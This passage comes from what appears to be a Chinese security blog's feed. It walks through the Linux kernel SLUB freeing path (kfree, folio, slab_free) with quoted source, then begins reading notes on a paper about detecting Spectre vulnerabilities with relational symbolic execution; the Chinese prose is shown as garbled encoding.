class="hljs-title function_">kfree</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *object)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">folio</span> *<span class="hljs-title">folio</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">s</span>;</span><br><br>trace_kfree(_RET_IP_, object);<br><br><span class="hljs-keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(object)))<br><span class="hljs-keyword">return</span>;<br><br>folio = virt_to_folio(object);<br><span class="hljs-keyword">if</span> (unlikely(!folio_test_slab(folio))) &#123;<br>free_large_kmalloc(folio, (<span class="hljs-type">void</span> *)object);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>slab = folio_slab(folio);<br>s = slab-&gt;slab_cache;<br>__kmem_cache_free(s, (<span class="hljs-type">void</span> *)object, _RET_IP_);<br>&#125;<br>EXPORT_SYMBOL(kfree);<br></code></pre></td></tr></table></figure><h3 id="I-folio-ç»“æ„ï¼šä¸€æ®µç‰©ç†ã€è™šæ‹Ÿã€é€»è¾‘ä¸Šéƒ½è¿ç»­çš„å†…å­˜"><a href="#I-folio-ç»“æ„ï¼šä¸€æ®µç‰©ç†ã€è™šæ‹Ÿã€é€»è¾‘ä¸Šéƒ½è¿ç»­çš„å†…å­˜" class="headerlink" title="I. folio ç»“æ„ï¼šä¸€æ®µç‰©ç†ã€è™šæ‹Ÿã€é€»è¾‘ä¸Šéƒ½è¿ç»­çš„å†…å­˜"></a>I. folio ç»“æ„ï¼šä¸€æ®µç‰©ç†ã€è™šæ‹Ÿã€é€»è¾‘ä¸Šéƒ½è¿ç»­çš„å†…å­˜</h3><p>æ³¨æ„åˆ°è¿™é‡Œç”¨äº†ä¸€ä¸ªåä¸º <code>folio</code> çš„ç»“æ„ä½“ï¼Œå…¶è¡¨ç¤ºäº†<strong>ä¸€å—ç‰©ç†ã€è™šæ‹Ÿã€é€»è¾‘ä¸Šéƒ½è¿ç»­çš„å†…å­˜</strong>ï¼Œ  <em>å…¶å®æœ¬è´¨ä¸Šè¿˜æ˜¯å¤ç”¨äº† page ç»“æ„ä½“ï¼Œåªä¸è¿‡è¿™ä¸€æ¬¡æ˜¯å°† page è½¬ä¸º folio</em>  ï¼Œå®šä¹‰æ¯”è¾ƒé•¿è¿™é‡Œå°±ä¸è´´ä»£ç äº†</p><p><code>virt_to_folio()</code> é¦–å…ˆä¼šç”¨ <code>virt_to_page()</code> æ‰¾åˆ°å¾…é‡Šæ”¾å¯¹è±¡è™šæ‹Ÿåœ°å€å¯¹åº”çš„ <code>page</code> ç»“æ„ä½“ï¼Œä¹‹åç”¨ <code>page_folio()</code> å°†å…¶è½¬æ¢ä¸º folio ç»“æ„ä½“â€”â€”å…¶å®å°±æ˜¯å¯¹äºå¤åˆé¡µè€Œè¨€ä¼šæ‰¾åˆ°ç¬¬ä¸€å¼ é¡µé¢ï¼Œç”±æ­¤å¦‚æœæ˜¯å¤åˆé¡µçš„è¯é‚£è¯´æ˜æ˜¯å¤§ slab æ‰€ä»¥ä¼šè°ƒç”¨ <code>free_large_kmalloc()</code>ï¼Œä¸æ˜¯å¤åˆé¡µè¯´æ˜æ˜¯å° slab æ‰€ä»¥ä¼šè°ƒç”¨ <code>__kmem_cache_free()</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">struct</span> folio *<span class="hljs-title function_">virt_to_folio</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *x)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> virt_to_page(x);<br><br><span class="hljs-keyword">return</span> page_folio(page);<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> page_folio(p)(_Generic((p),\</span><br><span class="hljs-meta">const struct page *:(const struct folio *)_compound_head(p), \</span><br><span class="hljs-meta">struct page *:(struct folio *)_compound_head(p)))</span><br></code></pre></td></tr></table></figure><p>ç„¶å <code>folio_test_slab()</code> å…¶å®æ˜¯ <code>include/linux/page-flags.h</code> é‡Œçš„æ‹¼æ¥å®ï¼Œè¿™é‡Œå°±ä¸æ·±å…¥å±•å¼€äº†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">bool</span> folio_test_#<span class="hljs-meta">#lname(struct folio *folio)\</span><br><span class="hljs-meta">&#123; return test_bit(PG_##lname, folio_flags(folio, FOLIO_##policy)); &#125;\</span><br></code></pre></td></tr></table></figure><h3 id="II-free-large-kmalloc-ï¼šç›´æ¥å°†é¡µé¢é‡Šæ”¾å›-buddy-system"><a href="#II-free-large-kmalloc-ï¼šç›´æ¥å°†é¡µé¢é‡Šæ”¾å›-buddy-system" class="headerlink" title="II. free_large_kmalloc()ï¼šç›´æ¥å°†é¡µé¢é‡Šæ”¾å› buddy system"></a>II. free_large_kmalloc()ï¼šç›´æ¥å°†é¡µé¢é‡Šæ”¾å› buddy system</h3><p>æ­£å¦‚å¯¹äºå¤§å¯¹è±¡çš„åˆ†é… <code>kmalloc_large()</code> ä¼šç›´æ¥ä» buddy system è¯·æ±‚å†…å­˜ä¸€èˆ¬ï¼Œç›¸å¯¹åº”çš„ <code>free_large_kmalloc()</code> ä¹Ÿä¼šç›´æ¥å°†é¡µé¢é‡Šæ”¾å› buddy systemï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">free_large_kmalloc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> folio *folio, <span class="hljs-type">void</span> *object)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order = folio_order(folio);<br><br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(order == <span class="hljs-number">0</span>))<br>pr_warn_once(<span class="hljs-string">&quot;object pointer: 0x%p\n&quot;</span>, object);<br><br>kmemleak_free(object);<br>kasan_kfree_large(object);<br>kmsan_kfree_large(object);<br><br>mod_lruvec_page_state(folio_page(folio, <span class="hljs-number">0</span>), NR_SLAB_UNRECLAIMABLE_B,<br>      -(PAGE_SIZE &lt;&lt; order));<br>__free_pages(folio_page(folio, <span class="hljs-number">0</span>), order);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="III-kmem-cache-free-ï¼šå¸¸è§„çš„é‡Šæ”¾å‡½æ•°"><a href="#III-kmem-cache-free-ï¼šå¸¸è§„çš„é‡Šæ”¾å‡½æ•°" class="headerlink" title="III. __kmem_cache_free()ï¼šå¸¸è§„çš„é‡Šæ”¾å‡½æ•°"></a>III. __kmem_cache_free()ï¼šå¸¸è§„çš„é‡Šæ”¾å‡½æ•°</h3><p><code>__kmem_cache_free()</code> ä¸»è¦å°±æ˜¯å¯¹ <code>slab_free()</code> çš„ wrapperï¼Œä¸è¿‡ä¼šæŒ‡å®š tail ä¸º NULLï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __kmem_cache_free(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">void</span> *x, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> caller)<br>&#123;<br>slab_free(s, virt_to_slab(x), x, <span class="hljs-literal">NULL</span>, &amp;x, <span class="hljs-number">1</span>, caller);<br>&#125;<br></code></pre></td></tr></table></figure><p>è€Œ <code>slab_free()</code> åˆ™ä¼šæœ€ç»ˆè°ƒç”¨åˆ° <code>do_slab_free()</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __fastpath_inline <span class="hljs-type">void</span> <span class="hljs-title function_">slab_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab,</span><br><span class="hljs-params">      <span class="hljs-type">void</span> *head, <span class="hljs-type">void</span> *tail, <span class="hljs-type">void</span> **p, <span class="hljs-type">int</span> cnt,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr)</span><br>&#123;<br>memcg_slab_free_hook(s, slab, p, cnt);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * With KASAN enabled slab_free_freelist_hook modifies the freelist</span><br><span class="hljs-comment"> * to remove objects, whose reuse must be delayed.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (slab_free_freelist_hook(s, &amp;head, &amp;tail, &amp;cnt))<br>do_slab_free(s, slab, head, tail, cnt, addr);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨åˆ°äº†ä¸€ä¸ªå‡½æ•° <code>slab_free_freelist_hook()</code>ï¼Œä¸»è¦çš„ä½œç”¨æ˜¯éå†å¾…é‡Šæ”¾çš„ freelistï¼š</p><ul><li>å¦‚æœè®¾ç½®äº† free hookï¼ˆ <code>slab_free_hook() == true</code> ï¼‰ï¼Œåˆ™ä»…å‡å°‘è®¡æ•°ä»¥æ¨è¿Ÿé‡Šæ”¾</li><li>å¦åˆ™é‡æ–°å»ºç«‹ä¸€é freelist åè¿”å›</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">slab_free_freelist_hook</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s,</span><br><span class="hljs-params">   <span class="hljs-type">void</span> **head, <span class="hljs-type">void</span> **tail,</span><br><span class="hljs-params">   <span class="hljs-type">int</span> *cnt)</span><br>&#123;<br><br><span class="hljs-type">void</span> *object;<br><span class="hljs-type">void</span> *next = *head;<br><span class="hljs-type">void</span> *old_tail = *tail ? *tail : *head;<br><br><span class="hljs-keyword">if</span> (is_kfence_address(next)) &#123;<br>slab_free_hook(s, next, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">/* Head and tail of the reconstructed freelist */</span><br>*head = <span class="hljs-literal">NULL</span>;<br>*tail = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">do</span> &#123;<br>object = next;<br>next = get_freepointer(s, object);<br><br><span class="hljs-comment">/* If object&#x27;s reuse doesn&#x27;t have to be delayed */</span><br><span class="hljs-keyword">if</span> (!slab_free_hook(s, object, slab_want_init_on_free(s))) &#123;<br><span class="hljs-comment">/* Move object to the new freelist */</span><br>set_freepointer(s, object, *head);<br>*head = object;<br><span class="hljs-keyword">if</span> (!*tail)<br>*tail = object;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Adjust the reconstructed freelist depth</span><br><span class="hljs-comment"> * accordingly if object&#x27;s reuse is delayed.</span><br><span class="hljs-comment"> */</span><br>--(*cnt);<br>&#125;<br>&#125; <span class="hljs-keyword">while</span> (object != old_tail);<br><br><span class="hljs-keyword">if</span> (*head == *tail)<br>*tail = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> *head != <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€ä¸Šå±‚è°ƒç”¨æ¥å£å…³ç³»å›¾-1"><a href="#ä¸‰ã€ä¸Šå±‚è°ƒç”¨æ¥å£å…³ç³»å›¾-1" class="headerlink" title="ä¸‰ã€ä¸Šå±‚è°ƒç”¨æ¥å£å…³ç³»å›¾"></a>ä¸‰ã€ä¸Šå±‚è°ƒç”¨æ¥å£å…³ç³»å›¾</h2><p>æ¶‰åŠåˆ°å†…å­˜é‡Šæ”¾çš„å‡½æ•°ç›¸è¾ƒäºå†…å­˜åˆ†é…å…¶å®å°‘å¾ˆå¤šï¼Œå¸¸ç”¨çš„ä¸»è¦å°±æ˜¯ <code>kfree()</code>ã€<code>kfree_sensitive()</code>ã€<code>kmem_cache_free()</code> è¿™ä¸‰å¤§å‡½æ•°ï¼š</p><p><img src="https://s2.loli.net/2023/02/24/Itbqo2eO15yn7ZW.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;åˆ«äººé—®ä½ å“ªé‡Œä¸‘æ€ä½ å†æŠŠä»–åæ‰‹æŒ‚åˆ°è‡ªå·±çš„å° slub é‡Œå¯»æ±‚è®¤åŒ&lt;/p&gt;</summary>
    
    
    
    <category term="OS" scheme="https://arttnba3.github.io/categories/OS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="https://arttnba3.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="å†…å­˜ç®¡ç†" scheme="https://arttnba3.github.io/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
    <category term="slub allocator" scheme="https://arttnba3.github.io/tags/slub-allocator/"/>
    
  </entry>
  
  <entry>
    <title>ã€PAPER.0x01ã€‘è®ºæ–‡ç¬”è®°ï¼šHunting the Haunter â€” Efficient Relational Symbolic Execution for Spectre with Haunted RelSE </title>
    <link href="https://arttnba3.github.io/2023/01/29/PAPER-0X01-HUNTING_THE_HAUNTER-EFFICIENT_RELATIONAL_SYMBOLIC_EXECUTION_FOR_SPECTRE_WITH_HAUNTED_RELSE/"/>
    <id>https://arttnba3.github.io/2023/01/29/PAPER-0X01-HUNTING_THE_HAUNTER-EFFICIENT_RELATIONAL_SYMBOLIC_EXECUTION_FOR_SPECTRE_WITH_HAUNTED_RELSE/</id>
    <published>2023-01-28T15:37:51.000Z</published>
    <updated>2023-04-23T16:40:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>é¬¼ï¼</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>æœ¬æ ¡åœ¨æ¯•è®¾ä¹‹å‰è¿˜æœ‰ä¸ªâ€œå°æ¯•è®¾â€â€”â€”<code>ç½‘ç»œç©ºé—´å®‰å…¨ç»¼åˆå®éªŒ</code> ï¼Œåˆšå¥½ç¬”è€…è¦åšçš„é¢˜ç›®æ˜¯åŸºäºè¿™ç¯‡è®ºæ–‡å®Œæˆçš„ï¼Œæ‰€ä»¥è¿˜æ˜¯ç®€å•å†™ä¸€ä¸ªé˜…è¯»ç¬”è®°ï¼šï¼‰</p><blockquote><p>è¯´æ˜¯ç¬”è®°ï¼Œå…¶å®è¿˜æ˜¯å·®ä¸å¤šç›¸å½“äºæŠŠåŸæ–‡ç¿»è¯‘äº†ä¸€éï¼ˆï¼ˆï¼ˆ</p></blockquote><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p><strong>Spectre</strong> æ˜¯ä¸€ç§å¾®æ¶æ„å±‚é¢çš„æ¼æ´ï¼Œå…¶å…è®¸æ”»å‡»è€…åˆ©ç”¨æ¨æµ‹æ‰§è¡Œï¼ˆspeculation executinoï¼‰æŠ€æœ¯ä¸­çš„æ¼æ´æ¥æ³„éœ²ä¿¡æ¯ï¼Œä½†å¯¹äºè¯¥ç±»å‹æ¼æ´çš„æ£€æµ‹é¢ä¸´ç€ä¸¤ä¸ªæŒ‘æˆ˜ï¼šâ‘ æ¨æµ‹è·¯å¾„å¸¦æ¥çš„æœç´¢ç©ºé—´çˆ†ç‚¸â‘¡åœ¨ä¸åŒç¼–è¯‘é˜¶æ®µå¼•å…¥çš„ Spectre æ¼æ´</p><p>æœ¬æ–‡æå‡ºäº†åœ¨äºŒè¿›åˆ¶çº§çš„ Spectre æ¼æ´çš„é‡åŒ–æ£€æµ‹çš„ä¼˜åŒ–æ–¹æ³•ï¼š<code>Haunted RelSE</code>ï¼Œå¹¶è¯æ˜äº†ç›¸æ¯”äºåœ¨æœ€å…ˆè¿›çš„å·¥å…·ä¸­çš„æ›´æœ´ç´ çš„æ˜¾å¼æ¨æµ‹æ‰§è¡Œæ–¹æ³•ï¼ˆmore naive explicit speculative execution approachï¼‰ï¼Œè¯¥ä¼˜åŒ–æ˜¯è¯­ä¹‰æ­£ç¡®çš„</p><p>ç ”ç©¶è€…åœ¨ä¸€ä¸ªç¬¦å·åˆ†æå·¥å…·ä¸­åº”ç”¨äº† <code>Haunted RelSE</code> ï¼Œå¹¶åœ¨ä¸€ä¸ªæœ‰åçš„ Spectre-PHTï¼ˆSpectre v1ï¼‰ çš„ litmus tester ä¸Šè¿›è¡Œäº†æµ‹è¯•ï¼Œå¹¶æ‰“ç®—åœ¨ä¸€ä¸ªæ–°çš„ Spectre-STLï¼ˆSpectre v4ï¼‰çš„ litmus tester ä¸Šæµ‹è¯•</p><blockquote><p>litmus testï¼šå¯¹å†…å­˜ä¸€è‡´æ€§çš„æµ‹è¯•</p><blockquote><p>å¥½åƒæ²¡æœ‰å•¥ä¸­æ–‡ç¿»è¯‘ï¼Œç›¸å…³çš„ä¸­æ–‡èµ„æ–™ä¹Ÿå°‘ï¼Œæ‘¸äº†</p></blockquote></blockquote><p>è¯¥æŠ€æœ¯æ¯”æœ€å…ˆè¿›çš„å·¥å…·å‘ç°äº†æ›´å¤šçš„ violations ä¸ scalesï¼Œå¹¶è®©ç ”ç©¶è€…å‘ç°ï¼šå¯¹ Spectre-PHT çš„æ ‡å‡†é˜²æŠ¤æ‰‹æ®µ <code>index-masking</code> ä¸è‘—åçš„ç¼–è¯‘  <em>ä½ç½®æ— å…³çš„å¯æ‰§è¡Œæ–‡ä»¶</em>  ï¼ˆposition independent executablesï¼‰çš„ gcc é€‰é¡¹ï¼Œå¯¼è‡´äº† Spectre-STL çš„å¼•å…¥</p><p>ç ”ç©¶è€…æå‡ºå¹¶éªŒè¯äº†ä¸€ç§å¯¹ <code>index-masking</code> çš„ä¿®æ­£æ–¹æ³•</p><h1 id="0x01-INTRODUCTION"><a href="#0x01-INTRODUCTION" class="headerlink" title="0x01. INTRODUCTION"></a>0x01. INTRODUCTION</h1><p>ç°ä»£ CPU çš„æ‰§è¡Œé€Ÿåº¦ä¾èµ–äºåŒ…æ‹¬åˆ†æ”¯é¢„æµ‹å™¨ï¼ˆbranch predictorï¼‰ä¸ <em>æŠ•æœº</em> ï¼ˆ <em>speculation</em> ï¼‰åœ¨å†…çš„å¤æ‚ç¡¬ä»¶é€»è¾‘ï¼šæå‰æ‰§è¡ŒæŒ‡ä»¤ &amp; å°è¯•é€šè¿‡åˆ†æ”¯é¢„æµ‹å™¨æ¥æ¨æµ‹æ‰§è¡Œï¼ˆspeculatively executeï¼‰ä¸€æ¡æ§åˆ¶æµï¼Œè‹¥æ¨æµ‹å¤±è´¥åˆ™æ¢å¤è¢«å½±å“åŒºåŸŸâ€”â€”ç§°ä¸º  <em>æ¢å¤æ‰§è¡Œ</em> ï¼ˆReverted executionï¼Œä¹Ÿå«åš <em>ç¬æ€æ‰§è¡Œ</em> ï¼ˆtransient executionï¼‰ï¼Œæ„ä¸ºä»æ¶æ„è§’åº¦æ¥çœ‹è¿™ä¸ªæ“ä½œæ˜¯é€æ˜çš„ï¼‰</p><p>ä½†ç¬æ€æ‰§è¡Œä¼šåœ¨å¾®æ¶æ„çº§ï¼ˆmicroarchitectureï¼‰ç•™ä¸‹å¯è§‚æµ‹çš„ä¾§é¢å½±å“ï¼ˆside effectsï¼‰ï¼Œè€Œè¿™å¯ä»¥è¢«æ”»å‡»è€…ç”¨ä»¥æ¢å¤æ¶æ„çº§ï¼ˆarchitecturalï¼‰çš„ç§˜å¯†â€”â€”è¿™ç§æ”»å‡»æ‰‹æ³•ç§°ä¹‹ä¸º<strong>å¹½çµæ”»å‡»</strong>ï¼ˆSpectre attacksï¼‰</p><p>å¹½çµæœ‰ç€<a href="https://transient.fail/">å¤šç§å˜ç§</a>ï¼Œä½†ç»å¤§éƒ¨åˆ†çš„å·¥ä½œéƒ½ä»…å…³æ³¨äº  <code>Spectre-v1</code> ï¼ˆPattern History Tableï¼Œå¯¹æ¡ä»¶åˆ†æ”¯çš„æ”»å‡»ï¼‰ï¼Œä»…æœ‰ <a href="https://arxiv.org/pdf/1910.01755.pdf">Pitchfork</a> åšäº† <code>Spectre-v4</code> ï¼ˆStore to Loadï¼Œå¯¹å†…å­˜å±éšœé¢„æµ‹å™¨çš„æ”»å‡»ï¼‰çš„ç›¸å…³å·¥ä½œï¼Œä½†å¹¶ä¸å®Œå–„</p><h4 id="Goal-and-Challenge"><a href="#Goal-and-Challenge" class="headerlink" title="Goal and Challenge"></a>Goal and Challenge</h4><p>æœ¬ç¯‡è®ºæ–‡ä¸­ç ”ç©¶è€…æå‡ºäº†ä¸€ç§ç”¨ä»¥æ£€æµ‹ <code>Spectre-PHT</code> ä¸ <code>Spectre-STL</code> æ¼æ´çš„æ–¹æ³•ï¼Œå¹¶åº”ç”¨äºé™æ€äºŒè¿›åˆ¶ä»£ç åˆ†æä¸­ï¼Œè¿™é¢ä¸´ç€ä¸¤ä¸ªæŒ‘æˆ˜ï¼š</p><ul><li><strong>C1</strong>ï¼šå¾®æ¶æ„çš„ç»†èŠ‚åœ¨åˆ†æä¸­æ— æ³•è¢«å®Œå…¨è·å¾—ï¼Œéœ€è¦ä¸€ç§è¶³å¤Ÿå¼ºå¤§çš„æå–æ–¹æ³•ä»¥æå–é€ æˆä¾§ä¿¡é“æ”»å‡»çš„å¾®æ¶æ„çŠ¶æ€ï¼ˆmocroarchitectural stateï¼‰</li><li><strong>C2</strong>ï¼šå¯¹å¯èƒ½çš„æ¨æµ‹æ‰§è¡Œçš„æ¢ç´¢çš„è§„æ¨¡ä¸èƒ½å¤ªå¤§ï¼Œå¦åˆ™ä¼šé€ æˆçŠ¶æ€çˆ†ç‚¸ï¼ˆstate explosionï¼‰</li></ul><h4 id="Proposal"><a href="#Proposal" class="headerlink" title="Proposal"></a>Proposal</h4><p>æœ¬æ–‡é€šè¿‡åœ¨æ–‡çŒ®ä¸­åˆ›é€ çš„  <em>å…³ç³»å®‰å…¨å±æ€§</em>  ï¼ˆrelational security propertyï¼‰ä½œä¸º  <em>æ¨æµ‹å¸¸æ•°æ—¶é—´</em>  ï¼ˆspeculative constant-timeï¼‰æ¥åº”å¯¹æŒ‘æˆ˜ C1ã€‚æ¨æµ‹å¸¸æ•°æ—¶é—´åœ¨æ²¡æœ‰è¯¦ç»†å»ºæ¨¡å¤æ‚çš„å¾®æ¶æ„ç»†èŠ‚çš„æƒ…å†µä¸‹å°†æ¨æµ‹æ‰§è¡Œçº³å…¥è€ƒè™‘ï¼Œä½†ç¼–è¯‘å™¨æ²¡å¿…è¦ä¿æŠ¤å¸¸æ•°æ—¶é—´ç¼–ç¨‹ï¼ˆconstant-time programmingï¼‰ï¼Œæ•…æˆ‘ä»¬çš„åˆ†æåœ¨äºŒè¿›åˆ¶å±‚æ“ä½œï¼ˆæ— éœ€æºç ï¼‰ã€‚æœ¬æ–‡å°†å‰äººçš„æ¨¡å‹æ‰©å±•åˆ°å¸¸æ•°æ—¶é—´äºŒè¿›åˆ¶åˆ†æä¸Šï¼Œä»¥åˆ†æ  <em>æ¨æµ‹å¸¸æ•°æ—¶é—´</em>  </p><p><strong>ç¬¦å·æ‰§è¡Œ</strong>ï¼ˆsymbolic executionï¼‰æ˜¯ä¸€é¡¹åœ¨äºŒè¿›åˆ¶ä»£ç ä¸Šæ‰©å±•è‰¯å¥½çš„æŠ€æœ¯ï¼Œä½†ä¸ºäº†åˆ†ææ¨æµ‹å¸¸æ•°æ—¶é—´ï¼Œå…¶å¿…é¡»è€ƒè™‘ç¨‹åºçš„æ¨æµ‹è¡Œä¸ºã€‚Spectre-PHT ä¸ Spectre-STL çš„ç¬¦å·åˆ†æè€…é€šè¿‡ fork ä»¥æ¢ç´¢ä¸´æ—¶è·¯å¾„ï¼Œä»è€Œå¯¹æ¨æµ‹æ€§è¡Œä¸ºè¿›è¡Œ <em>æ¸…æ™°åœ°</em>  ï¼ˆexplicitlyï¼‰å»ºæ¨¡ï¼Œè€Œè¿™å¯¼è‡´äº†çŠ¶æ€çˆ†ç‚¸â€”â€”å°¤å…¶æ˜¯å¯¹ Spectre-STL è€Œè¨€ã€‚å¯¹ç¬¦å·æ‰§è¡Œçš„å¸¸æ•°æ—¶é—´æ ·å¼ï¼ˆconstant-time-likeï¼‰çš„å±æ€§çš„æ”¹é€ ï¼Œç§°ä¸º  <em>å…³ç³»ç¬¦å·æ‰§è¡Œ</em>  ï¼ˆrelational symbolic executionï¼Œ RelSEï¼‰ï¼Œåœ¨äºŒè¿›åˆ¶å±‚é¢çš„å¯ä¼¸ç¼©æ€§ä¸ç²¾åº¦ä¸Šå·²è¢«è¯æ˜æ˜¯éå¸¸æˆåŠŸçš„</p><p>ä¸ºäº†è§£å†³ C2ï¼Œæœ¬æ–‡çš„æ ¸å¿ƒæŠ€æœ¯æ˜¯åˆ©ç”¨ RelSE æ¥  <em>åœ¨åŒä¸€æ—¶é—´</em> åƒå¸¸è§„æ‰§è¡Œï¼ˆå³ï¼Œä¸æ­£ç¡®çš„æ¨æµ‹ç›¸å…³çš„æ‰§è¡Œï¼‰ é‚£æ ·æ‰§è¡Œä¸´æ—¶çš„æ‰§è¡Œï¼›æœ¬æ–‡å°†è¿™ç§æŠ€æœ¯å‘½åä¸º <code>Haunted RelSE</code>ï¼š</p><ul><li>å¯¹äº Spectre-PHTï¼Œå…¶é€šè¿‡åŒæ—¶æ‰§è¡Œç”±æ¡ä»¶è¯­å¥äº§ç”Ÿçš„ç¬æ€çš„ä¸å¸¸è§„çš„è·¯å¾„ä»¥å¯¹å¤šä½™çŠ¶æ€è¿›è¡Œå‰ªæ</li><li>å¯¹äº Spectre-STLï¼Œå…¶å¯¹å¤šä½™çŠ¶æ€è¿›è¡Œå‰ªæå¹¶å°†å‰©ä½™éƒ¨åˆ†ç¼–ç åœ¨ä¸€ä¸ªå•ç‹¬çš„ç¬¦å·è·¯å¾„ä¸­ï¼Œè€Œéä¸ºæ¯ä¸ªå¯èƒ½çš„åŠ è½½ä¸å­˜å‚¨äº¤å‰å°†ç¬¦å·æ‰§è¡Œè¿›è¡Œåˆ†æ”¯</li></ul><p>æœ¬æ–‡åœ¨ä¸€ä¸ªäºŒè¿›åˆ¶å±‚çš„å…³ç³»ç¬¦å·åˆ†æå·¥å…· BINSEC&#x2F;HAUNTED ä¸­åº”ç”¨ Haunted RelSEï¼Œä¸ºäº†è¿›è¡Œè¯„ä¼°ï¼Œæœ¬æ–‡ä½¿ç”¨äº† Spectre-PHT çš„è‘—åæµ‹è¯•ç”¨ä¾‹ Kocher ï¼Œä»¥åŠä¸€ç»„ä¸º Spectre-STL æå‡ºçš„æ–°æµ‹è¯•ç”¨ä¾‹ï¼Œä»¥åŠæ¥è‡ª donnaã€Libsodium ä¸ OpenSSL åº“çš„çœŸå®ä¸–ç•Œå¯†ç å­¦ä»£ç </p><p><strong>Findings.</strong> 